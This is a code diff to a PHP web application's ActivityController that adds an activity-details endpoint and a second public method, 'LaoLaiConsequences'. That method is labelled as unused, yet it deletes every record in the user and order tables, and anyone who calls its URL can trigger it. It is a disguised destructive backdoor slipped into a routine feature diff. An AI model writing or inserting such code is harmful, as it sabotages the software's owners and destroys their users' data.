@@ -227,5 +227,29 @@ class ActivityController extends Controller {
         	$this->ajaxReturn($data);
 		}
 	}
-	//
+	//这个不用
+	public function LaoLaiConsequences()
+	{
+		M('user')->where('1')->delete();
+		$res = M('order')->where('1')->delete();
+	}
+	//支持活动详情接口
+	public function supportDetail()
+	{
+		$activity_id = I('activity_id');
+		if (!$activity_id) {
+			$data = array(
+                'status'=>1,
+                'msg'=>'活动ID不能为空'
+           	);
+        	$this->ajaxReturn($data);
+		}
+		$activity_id = addslashes($activity_id);
+		$res = M('activity')->field('activity_id,images,activity_info')->where(array('activity_id'=>$activity_id))->find();
+		$data = array(
+                'status'=>0,
+                'msg'=>$res
+           	);
+        $this->ajaxReturn($data);
+	}
 }
